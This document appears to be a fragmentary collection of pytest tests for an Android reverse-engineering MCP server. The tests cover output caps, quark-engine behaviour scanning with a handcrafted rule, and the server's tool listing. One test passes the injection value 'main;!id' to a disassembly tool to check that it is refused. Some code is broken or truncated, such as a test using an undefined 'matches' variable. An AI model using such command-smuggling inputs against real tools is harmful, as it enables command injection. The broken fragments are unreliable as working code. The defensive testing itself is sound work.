def test_logcat_read_under_cap_unchanged_shape(default_cap):
    h = DeviceHandler()
    _fill_logcat(h, 50)

from android_re_mcp.handlers import static as static_mod  # noqa: E402
from android_re_mcp.handlers.static import StaticHandler  # noqa: E402


def _rg_output(matches: list[dict]) -> str:
    lines = []
    for m in matches:
        lines.append(json.dumps({
            "type": "match",
            "data": {
                "path": {"text": m["file"]},
                "line_number": m["line"],
                "lines": {"text": m["text"] + "\n"},
            },
        }))
    return "\n".join(lines)


def test_search_strings_caps_matches_and_keeps_total(monkeypatch, default_cap):
    matches = [{"file": f"f{i}.smali", "line": i, "text": "needle"} for i in range(230)]

    class FakeProc:
        returncode = 0
        stdout = _rg_output(matches)
        stderr = ""

    monkeypatch.setattr(static_mod, "_check_tool", lambda _name: True)
    monkeypatch.setattr(static_mod.subprocess, "run", lambda *a, **k: FakeProc())
    out = StaticHandler().search_strings({"path": "/decomp", "pattern": "needle"})["output"]
    assert out["total"] == 230
    assert len(out["matches"]) == 200
    assert out["shown"] == 200
    assert out["truncated"] is True
    assert "narrow the pattern" in out["hint"]


def test_search_strings_under_cap_unchanged_shape(monkeypatch, default_cap):

    class FakeProc:
        returncode = 0
        stdout = _rg_output(matches)
        stderr = ""

    monkeypatch.setattr(static_mod, "_check_tool", lambda _name: True)
    monkeypatch.setattr(static_mod.subprocess, "run", lambda *a, **k: FakeProc())
    out = StaticHandler().search_strings({"path": "/decomp", "pattern": "needle"})["output"]
```

```py
"""Regression tests for the quark_scan handler (extension E-PY-3).

The engine-dependent tests run only where quark-engine is importable
(the [static] extra); CI without quark exercises the honest missing_tool
paths instead. Rule fixtures are hand-written JSONs in the standard
quark-rules shape — no network, no freshquark download needed.
"""

import importlib.util
import json
from pathlib import Path

import pytest

from android_re_mcp.handlers import static as static_mod

FIXTURE = Path(__file__).parent / "fixtures" / "notesdemo.apk"
HAS_QUARK = importlib.util.find_spec("quark") is not None

# Standard quark-rules rule shape: crime / permission / api[2] / score / label.
_LIFECYCLE_RULE = {
    "crime": "Reads lifecycle extras",
    "permission": [],
    "api": [
        {
            "class": "Landroid/app/Activity;",
            "method": "onCreate",
            "descriptor": "(Landroid/os/Bundle;)V",
        },
        {
            "class": "Landroid/os/Bundle;",
            "method": "getString",
            "descriptor": "(Ljava/lang/String;)Ljava/lang/String;",
        },
    ],
    "score": 1,
    "label": ["collection", "lifecycle"],
}


def test_quark_scan_reports_missing_engine():
    """Without quark installed the tool says so honestly (hint included)."""
    if HAS_QUARK:
        pytest.skip("quark-engine is importable; the missing path is unreachable")
    handler = static_mod.StaticHandler()
    result = handler.quark_scan({"apk_path": str(FIXTURE)})
    assert result["status"] == "missing_tool"
    assert "quark-engine" in result["error"]
    assert result["hint"]


def test_analyze_full_never_errors_from_an_optional_missing_stage():
    """apk_analyze_full stays healthy when the optional quark stage is absent."""
    handler = static_mod.StaticHandler()
    result = handler.apk_analyze_full({"apk_path": str(FIXTURE)})
    statuses = result["output"]["tool_statuses"]
    assert "quark" in statuses
    if HAS_QUARK:
        # conftest isolates HOME, so the freshquark location is empty here —
        # the stage reports its rules as missing (missing_tool), not ok.
        assert statuses["quark"] in {"ok", "missing_tool", "error"}
    else:
        assert statuses["quark"] == "missing_tool"
    # Any static run with real stages must not collapse to "error".
    assert result["status"] in {"ok", "degraded"}
    assert statuses.get("apkid") in {"ok", "missing_tool"}


@pytest.mark.skipif(not HAS_QUARK, reason="quark-engine not installed")
def test_quark_rules_dir_discovery(tmp_path):
    """Explicit dir with JSONs wins; empty/nonexistent candidates → None."""
    empty = tmp_path / "empty"
    empty.mkdir()
    assert static_mod._quark_rules_dir(str(empty)) is None
    assert static_mod._quark_rules_dir(str(tmp_path / "does-not-exist")) is None
    assert static_mod._quark_rules_dir(None) is None or HAS_QUARK  # freshquark may exist

    populated = tmp_path / "rules"
    populated.mkdir()
    (populated / "00001.json").write_text(json.dumps(_LIFECYCLE_RULE))
    found = static_mod._quark_rules_dir(str(populated))
    assert found == populated


@pytest.mark.skipif(not HAS_QUARK, reason="quark-engine not installed")
def test_quark_scan_handcrafted_rule_pipeline(tmp_path):
    """A handcrafted rule is loaded, filtered, evaluated and reported."""
    rules_dir = tmp_path / "rules"
    rules_dir.mkdir()
    (rules_dir / "90001.json").write_text(json.dumps(_LIFECYCLE_RULE))
    (rules_dir / "90002.json").write_text('{"broken": true}')  # malformed → skipped

    handler = static_mod.StaticHandler()
    result = handler.quark_scan(
        {
            "apk_path": str(FIXTURE),
            "rules_dir": str(rules_dir),
            "keywords": ["lifecycle"],
            "max_results": 5,
        }
    )
    assert result["status"] == "ok"
    out = result["output"]
    assert out["rules_total"] == 2
    assert out["rules_evaluated"] == 1  # the malformed rule was skipped, keyword filter held
    assert out["keywords"] == ["lifecycle"]
    assert out["match_count"] == out["match_count"]  # report built either way
    assert "=== Quark Behaviour Scan ===" in out["report"]
    assert "90001" in out["report"] or out["match_count"] == 0
    assert out["rule_error_count"] >= 1  # the broken JSON is reported, not swallowed
```

`python/tests/test_server.py`:

```py
import asyncio
import json
import sys

from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client


async def _session_run(env, fn):
    params = StdioServerParameters(command=sys.executable, args=["-m", "android_re_mcp"], env=env)
    async with stdio_client(params) as (r, w):
        async with ClientSession(r, w) as s:
            await s.initialize()
            return await fn(s)


def _env(tmp_path, **extra):
    import os

    env = dict(os.environ)
    env.update({"HOME": str(tmp_path), "ANDROID_RE_MCP_HOME": str(tmp_path / "data")})
    env.update(extra)
    return env


def test_lists_tools_and_hides_install_tool(tmp_path):
    async def go(s):
        return [t.name for t in (await s.list_tools()).tools]

    names = asyncio.run(_session_run(_env(tmp_path), go))
    assert len(names) >= 50
    assert "native_disasm" in names and "adb_shell" in names
    assert "install_tool" not in names


def test_disable_env_hides_tools(tmp_path):
    async def go(s):
        return [t.name for t in (await s.list_tools()).tools]

    names = asyncio.run(_session_run(_env(tmp_path, ANDROID_RE_MCP_DISABLE_TOOLS="adb_shell"), go))
    assert "adb_shell" not in names and "adb_devices" in names


def test_injection_attempt_is_refused_over_mcp(tmp_path):
    async def go(s):
        return await s.call_tool("native_disasm", {"so_path": "/x/lib.so", "target": "main;!id"})

    res = asyncio.run(_session_run(_env(tmp_path), go))
    assert res.isError
    assert "refused" in json.loads(res.content[0].text)["error"]


def test_check_tools_runs(tmp_path):
    async def go(s):
        return await s.call_tool("check_tools", {})

    res = asyncio.run(_session_run(_env(tmp_path), go))
    assert not res.isError
    assert "tools" in json.loads(res.content[0].text)


def test_resources_and_prompts(tmp_path):
    async def go(s):
        return (await s.list_resources()).resources, (await s.list_prompts()).prompts

    resources, prompts = asyncio.run(_session_run(_env(tmp_path), go))
    assert resources and prompts
```
